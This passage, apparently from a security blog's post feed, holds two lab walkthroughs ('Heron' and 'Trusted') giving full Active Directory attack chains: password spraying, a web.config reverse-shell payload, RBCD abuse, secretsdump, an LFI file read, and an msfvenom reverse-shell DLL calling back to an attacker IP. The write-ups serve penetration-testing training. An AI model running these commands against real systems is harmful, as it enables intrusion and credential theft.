password"><br>Credentials obtained:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">samuel.davies : &lt;PASS&gt;</span><br></pre></td></tr></table></figure><h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>Enumerating SMB shares with the compromised user:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.232.133 -u &#x27;samuel.davies&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/shares_sam.png" alt="SMB shares for Samuel"><br>Found GPP password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.232.133 -u &#x27;samuel.davies&#x27; -p &#x27;&#x27; -M gpp_password</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/gpp_password.png" alt="GPP password extraction"><br>Testing credentials against SMB:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.232.133 -u usernames.txt -p &#x27;&lt;PASS&gt;&#x27; --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/new_account.png" alt="New account discovered"><br>New credentials discovered:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc-web-accounting-d:&lt;PASS&gt;</span><br></pre></td></tr></table></figure><p>Enumerating SMB shares with the new user:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.232.133 -u &#x27;svc-web-accounting-d&#x27; -p &#x27;&lt;PASS&gt;&#x27; --shares</span><br></pre></td></tr></table></figure><p>We find we have <code>accounting$ READ,WRITE</code> privileges. Within this share, we locate a web.config file:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">location</span> <span class="attr">path</span>=<span class="string">&quot;.&quot;</span> <span class="attr">inheritInChildApplications</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">handlers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;aspNetCore&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;*&quot;</span> <span class="attr">modules</span>=<span class="string">&quot;AspNetCoreModuleV2&quot;</span> <span class="attr">resourceType</span>=<span class="string">&quot;Unspecified&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aspNetCore</span> <span class="attr">processPath</span>=<span class="string">&quot;dotnet&quot;</span> <span class="attr">arguments</span>=<span class="string">&quot;.\AccountingApp.dll&quot;</span> <span class="attr">stdoutLogEnabled</span>=<span class="string">&quot;false&quot;</span> <span class="attr">stdoutLogFile</span>=<span class="string">&quot;.\logs\stdout&quot;</span> <span class="attr">hostingModel</span>=<span class="string">&quot;inprocess&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4--&gt;</span>  </span><br></pre></td></tr></table></figure><h2 id="Web-Application-Exploitation"><a href="#Web-Application-Exploitation" class="headerlink" title="Web Application Exploitation"></a>Web Application Exploitation</h2><p>First, we add the accounting vhost to our machine and log in to <code>http://accounting.heron.vl/</code> using <code>svc-web-accounting-d</code>. We don’t find any useful information, but discover a potential new user: <code>rhys.george@heron.vl</code>.<br>For our reverse shell, I recommend using the PowerShell #3 Base64 payload from <a href="https://www.revshells.com/">revshells</a>.<br>We modify the web.config file:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">location</span> <span class="attr">path</span>=<span class="string">&quot;.&quot;</span> <span class="attr">inheritInChildApplications</span>=<span class="string">&quot;false&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">handlers</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;aspNetCore&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;*&quot;</span> <span class="attr">modules</span>=<span class="string">&quot;AspNetCoreModuleV2&quot;</span> <span class="attr">resourceType</span>=<span class="string">&quot;Unspecified&quot;</span> /&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">aspNetCore</span> <span class="attr">processPath</span>=<span class="string">&quot;powershell&quot;</span> <span class="attr">arguments</span>=<span class="string">&quot;-e (BASE64 PAYLOAD)&quot;</span> <span class="attr">hostingModel</span>=<span class="string">&quot;OutOfProcess&quot;</span> /&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">location</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4--&gt;</span></span><br></pre></td></tr></table></figure><p>Then we create a hoaxshell and paste the base64 output in the arguments:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del web.config</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put web.config</span><br></pre></td></tr></table></figure><p>This gives us a shell as <code>svc-web-accounting</code> (set the shell to be on the jumpbox machine and not your attack machine).<br>A good idea is to use Sliver so you can use your tools to connect to the domain controller.<br>Ligolo setup:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444</span><br></pre></td></tr></table></figure><p>The shell should point at the Linux machine and address 1234, with the listener on our machine on port 4444:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>After setting everything up, refresh the page:<br><img src="/images/Heron/shell.png" alt="Shell established"></p><h2 id="Domain-Enumeration-with-BloodHound"><a href="#Domain-Enumeration-with-BloodHound" class="headerlink" title="Domain Enumeration with BloodHound"></a>Domain Enumeration with BloodHound</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.232.133 -u &#x27;svc-web-accounting-d&#x27; -p &#x27;&lt;PASS&gt;&#x27; --bloodhound --dns-server 10.10.232.133 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/bloodhoudnpath.png" alt="BloodHound attack path"></p><h2 id="Credential-Hunting-as-svc-web-accounting"><a href="#Credential-Hunting-as-svc-web-accounting" class="headerlink" title="Credential Hunting as svc-web-accounting"></a>Credential Hunting as svc-web-accounting</h2><p><img src="/images/Heron/sshscript.png" alt="SSH script discovery"><br>Inside the ssh.ps1 file, we find:<br><img src="/images/Heron/ssh_root_pass.png" alt="SSH root password"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$plinkPath = &quot;C:\Program Files\PuTTY\plink.exe&quot;</span><br><span class="line">$targetMachine = &quot;frajmp&quot;</span><br><span class="line">$user = &quot;_local&quot;</span><br><span class="line">$password = &quot;&lt;PASS&gt;&quot;</span><br><span class="line">&amp; &quot;$plinkPath&quot; -ssh -batch $user@$targetMachine -pw $password &quot;ps auxf; ls -lah /home; exit&quot;</span><br></pre></td></tr></table></figure><p>With this new user, we have full sudo access:<br><img src="/images/Heron/full_sudo.png" alt="Full sudo access"></p><h2 id="Lateral-Movement-via-Linux-Machine"><a href="#Lateral-Movement-via-Linux-Machine" class="headerlink" title="Lateral Movement via Linux Machine"></a>Lateral Movement via Linux Machine</h2><p>As this Linux machine is domain-joined, we can extract <code>krb5.keytab</code>, which contains secrets about the machine account. We use <a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a> to extract those secrets:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 keytabextract.py /etc/krb5.keytab</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/linux_machine_hash.png" alt="Linux machine hash extraction"><br>After password spraying, we get a hit on <code>julian.pratt</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.202.197 -u usernames.txt -p &#x27;&#x27; --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/pass_spray.png" alt="Password spray results"><br>We gain access to his home directory:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.202.197/home$ -U julian.pratt </span><br></pre></td></tr></table></figure><p><img src="/images/Heron/jul_homedir.png" alt="Julian&#39;s home directory"><br>After retrieving <code>mucjmp.lnk</code> to our local machine and examining it (just run <code>cat mucjmp.lnk</code> and there should be a cleartext string with the autologin credentials), we find credentials for <code>adm_prju</code>:<br><code>adm_prju@mucjmp -pw &lt;PASS&gt;</code></p><h2 id="Domain-Admin-Privilege-Escalation"><a href="#Domain-Admin-Privilege-Escalation" class="headerlink" title="Domain Admin Privilege Escalation"></a>Domain Admin Privilege Escalation</h2><p>From our BloodHound enumeration, we discovered that <code>adm_prju</code> is in the Admins_T1 group, which has <code>WriteAccountRestrictions</code> over the DC. To exploit this, we need a machine account. Fortunately, we have compromised the Linux machine account.<br>Now we can abuse Resource-Based Constrained Delegation (RBCD):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-rbcd -delegate-from &#x27;FRAJMP$&#x27; -delegate-to &#x27;MUCDC$&#x27; -action &#x27;write&#x27; &#x27;heron.vl/adm_prju:&lt;PASS&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/rbcd.png" alt="RBCD exploitation"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST -spn &#x27;cifs/mucdc.heron.vl&#x27; -impersonate &#x27;_admin&#x27; &#x27;heron.vl/FRAJMP$&#x27; -hashes :&lt;HASH&gt;</span><br></pre></td></tr></table></figure><p>Now we can attempt to dump all secrets through our SOCKS proxy using Impacket’s secretsdump command with our Kerberos ticket. The output may be slow since it has to tunnel through the proxy, so be patient:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -k mucdc.heron.vl</span><br></pre></td></tr></table></figure><p>We tried using WinRM, but it’s disabled, so we’ll use psexec instead:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec heron.vl/&#x27;_admin&#x27;@heron.vl -hashes :&lt;HASH&gt;</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=395c9eb2-2c08-4675-9b0e-3bf0bb3c4c44">https://api.vulnlab.com/api/v1/share?id=395c9eb2-2c08-4675-9b0e-3bf0bb3c4c44</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
            <tag> Chain </tag>
            
            <tag> -VulnLab - Hack The Box - Chain </tag>
            
            <tag> VulnLab - Hack The Box - Chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Trusted</title>
      <link href="/2025/04/13/VL-Trusted/"/>
      <url>/2025/04/13/VL-Trusted/</url>
      
        <content type="html"><![CDATA[<h1 id="Trusted-Exploiting-Domain-Trust-Relationships-in-Active-Directory"><a href="#Trusted-Exploiting-Domain-Trust-Relationships-in-Active-Directory" class="headerlink" title="Trusted: Exploiting Domain Trust Relationships in Active Directory"></a>Trusted: Exploiting Domain Trust Relationships in Active Directory</h1><p>In this detailed VulnLab - Hack The Box walkthrough of the “Trusted” machine, we navigate through a sophisticated Active Directory environment to demonstrate how trust relationships between domains can be exploited. Starting with basic web enumeration that reveals a critical Local File Inclusion (LFI) vulnerability, we progressively escalate privileges by leveraging credential harvesting, Active Directory permissions abuse, and ultimately performing a domain trust attack. This step-by-step walkthrough showcases advanced Windows penetration testing techniques including DLL hijacking, Kerberos ticket manipulation, and DCSync attacks that cybersecurity professionals can apply to secure enterprise environments against similar vulnerabilities.</p><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>Our initial port scan revealed several open ports and services on the target:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.53 </span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-12 19:39:41Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows </span><br><span class="line">443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.53 </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3306/tcp  open  mysql         syn-ack ttl 127 MariaDB 5.5.5-10.4.24</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.4.24-MariaDB</span><br><span class="line">|   Thread ID: 9</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: SupportsTransactions, Support41Auth, FoundRows, Speaks41ProtocolNew, SupportsCompression, IgnoreSigpipes, DontAllowDatabaseTableColumn, LongColumnFlag, InteractiveClient, SupportsLoadDataLocal, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, ODBCClient, Speaks41ProtocolOld, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: V7M]l*(*:&#x27;O=&quot;/g&lt;2%a:</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: LAB</span><br><span class="line">|   NetBIOS_Domain_Name: LAB</span><br><span class="line">|   NetBIOS_Computer_Name: LABDC</span><br><span class="line">|   DNS_Domain_Name: lab.trusted.vl</span><br><span class="line">|   DNS_Computer_Name: labdc.lab.trusted.vl</span><br><span class="line">|   DNS_Tree_Name: trusted.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-04-12T19:40:41+00:00</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI </span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows</span><br><span class="line">49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">57941/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">58459/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>The target is running a web server on port 80. I used feroxbuster to discover hidden directories:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster -u http://10.10.213.214/</span><br></pre></td></tr></table></figure><p>This revealed a <code>/dev</code> directory:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">301      GET        9l       30w      336c http://10.10.213.214/dev =&gt; http://10.10.213.214/dev/</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/xamoo.png" alt="Xamoo Homepage"><br><img src="/images/Trusted/manes_winchester.png" alt="Manes Winchester Page"></p><h2 id="Exploiting-Local-File-Inclusion-LFI"><a href="#Exploiting-Local-File-Inclusion-LFI" class="headerlink" title="Exploiting Local File Inclusion (LFI)"></a>Exploiting Local File Inclusion (LFI)</h2><p>Testing for LFI vulnerability:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.213.214/dev/index.html?view=../</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/unsecure_file_query.png" alt="Unsecure File Query"><br>Confirming the LFI vulnerability by accessing Windows system files:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.213.214/dev/index.html?view=../../../../../../windows/win.ini</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/100vulnerable.png" alt="LFI Vulnerability Confirmed"><br>Using ffuf to enumerate potential files via LFI:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u &quot;http://10.10.213.214/dev/index.html?view=FUZZ&quot; -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -e .php,.txt,.log,.ini -fl 35,33,40</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/dbfile.png" alt="DB File Found"><br>To extract the contents of the PHP file, I used a base64 filter:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.213.214/dev/index.html?view=php://filter/read=convert.base64-encode/resource=db.php</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/mongodbpass.png" alt="MongoDB Password"></p><h2 id="Database-Enumeration"><a href="#Database-Enumeration" class="headerlink" title="Database Enumeration"></a>Database Enumeration</h2><p>After decoding the base64 output, I obtained MySQL credentials:<br>root : SuperSecureMySQLPassw0rd1337.<br>Connecting to the MySQL server:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 10.10.213.214 -u root -p --skip-ssl</span><br></pre></td></tr></table></figure><p>Enumerated the databases and tables:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br><span class="line">USE news;</span><br><span class="line">SHOW TABLES;</span><br><span class="line">SELECT * FROM users;</span><br></pre></td></tr></table></figure><p>Retrieved user credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----+------------+--------------+-----------+----------------------------------+</span><br><span class="line">| id | first_name | short_handle | last_name | password                         |</span><br><span class="line">+----+------------+--------------+-----------+----------------------------------+</span><br><span class="line">|  1 | Robert     | rsmith       | Smith     | 7e7abb54bbef42f0fbfa3007b368def7 |</span><br><span class="line">|  2 | Eric       | ewalters     | Walters   | d6e81aeb4df9325b502a02f11043e0ad |</span><br><span class="line">|  3 | Christine  | cpowers      | Powers    | e3d3eb0f46fe5d75eed8d11d54045a60 |</span><br><span class="line">+----+------------+--------------+-----------+----------------------------------+</span><br></pre></td></tr></table></figure><p>After cracking the hashes:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsmith : IHateEric2</span><br></pre></td></tr></table></figure><h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>Checked for accessible SMB shares with the credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.213.214 -u rsmith -p &lt;PASS&gt; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/rsmith_shares.png" alt="RSmith Shares"><br>Other user accounts identified:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ewalters  </span><br><span class="line">cpowers</span><br></pre></td></tr></table></figure><p>No valuable content was found on the accessible shares.</p><h2 id="Active-Directory-Enumeration-with-BloodHound"><a href="#Active-Directory-Enumeration-with-BloodHound" class="headerlink" title="Active Directory Enumeration with BloodHound"></a>Active Directory Enumeration with BloodHound</h2><p>Used BloodHound to map the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.213.214 -u rsmith -p IHateEric2 --bloodhound --dns-server 10.10.213.214 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure><p>BloodHound revealed a bidirectional domain trust between <code>trusted.vl</code> and <code>lab.trusted.vl</code>:<br><img src="/images/Trusted/crooss_domain_trust.png" alt="Cross Domain Trust"><br>Also discovered that <code>rsmith</code> has ForceChangePassword rights over <code>ewalters</code>:<br><img src="/images/Trusted/path.png" alt="Attack Path"></p><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><p>Exploiting the ForceChangePassword right to gain access as <code>ewalters</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host &quot;labdc.lab.trusted.vl&quot; -d &quot;lab.trusted.vl&quot; -u &quot;rsmith&quot; -p &quot;&lt;PASS&gt;&quot; set password &quot;ewalters&quot; &quot;HelloWorld123@&quot;</span><br></pre></td></tr></table></figure><p>Connecting with the new credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i labdc.lab.trusted.vl -u ewalters -p HelloWorld123@</span><br></pre></td></tr></table></figure><p>In the C:\AVTest directory, found an interesting readme:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type readme.txt</span><br><span class="line">Since none of the AV Tools we tried here in the lab satisfied our needs it&#x27;s time to clean them up.</span><br><span class="line">I asked Christine to run them a few times, just to be sure.</span><br><span class="line"></span><br><span class="line">Let&#x27;s just hope we don&#x27;t have to set this lab up again because of this.</span><br></pre></td></tr></table></figure><h2 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h2><p>Transferred the KasperskyRemovalTool.exe to analyze:<br>On Linux:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver smb /mnt -smb2support</span><br></pre></td></tr></table></figure><p>On Windows:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy .\KasperskyRemovalTool.exe \\10.8.5.195\smb\KasperskyRemovalTool.exe</span><br></pre></td></tr></table></figure><p>Analyzed the executable with Process Monitor to identify DLL injection opportunities:</p><p>Set up filters for:</p><ol><li>Process Name</li><li>Path containing .dll</li><li>Result containing “NAME NOT FOUND”</li></ol><p><img src="/images/Trusted/filter_name.png" alt="Filter Name"><br><img src="/images/Trusted/dllfilter.png" alt="DLL Filter"><br><img src="/images/Trusted/FINAL_FILTER.png" alt="Final Filter"><br>Process Monitor revealed that the executable attempts to load a DLL named <code>KasperskyRemovalToolENU.dll</code> from the current directory:<br><img src="/images/Trusted/DLL_injection.png" alt="DLL Injection Opportunity"><br>Created a malicious DLL with the same name containing a reverse shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.8.5.195 LPORT=4444 -f dll &gt; KasperskyRemovalToolENU.dll</span><br></pre></td></tr></table></figure><p>Set up SMB server to transfer the file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver smb /mnt -smb2support</span><br></pre></td></tr></table></figure><p>Copied the malicious DLL to the target:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\10.8.5.195\smb\KasperskyRemovalToolENU.dll .\KasperskyRemovalToolENU.dll</span><br></pre></td></tr></table></figure><p>After executing the Kaspersky tool, received a reverse shell:<br><img src="/images/Trusted/gotshell.png" alt="Got Shell"></p><h2 id="Privilege-Escalation-via-Domain-Trust-Abuse"><a href="#Privilege-Escalation-via-Domain-Trust-Abuse" class="headerlink" title="Privilege Escalation via Domain Trust Abuse"></a>Privilege Escalation via Domain Trust Abuse</h2><p>Uploaded Mimikatz to map domain trust and forge a golden ticket:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 